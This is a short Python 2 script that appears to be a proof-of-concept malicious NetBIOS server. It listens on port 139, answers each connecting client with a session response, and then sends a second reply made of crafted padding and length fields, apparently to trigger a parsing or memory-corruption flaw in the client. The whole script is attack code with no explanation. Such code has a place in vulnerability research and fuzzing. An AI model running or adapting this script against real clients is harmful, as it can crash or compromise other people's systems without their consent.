#!/usr/bin/env python2

from socket import *
import sys
import struct

host=''
port=139

ss=socket(AF_INET,SOCK_STREAM)
ss.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

ss.bind((host,port))
ss.listen(11)

while 1:
    sock , a=ss.accept()
    print 'got a connection from %s' % str(a)
    s = sock.recv(1000)
    print list(s)

    s='\x82'
    s+='\x00'
    #s+=struct.pack('>h',512)
    b=( 'a'*12 + '\x00') * 2
    s+=struct.pack('>h',len(b))
    s+=b
    sock.sendall(s)
    print 'resp1 sent'

    s=sock.recv(1000)
    print list(s)
    s='ab'
    b='12345\x0078xyzd' 
    b+='abcd'*5 + '\x0d\x00\x008'+'1234'*(8-4)
    b+='c'*(220-12-32)
    s+=struct.pack('>h',len(b))
    s+=b
    sock.sendall(s)
    print list(sock.recv(10000))
    sys.exit()
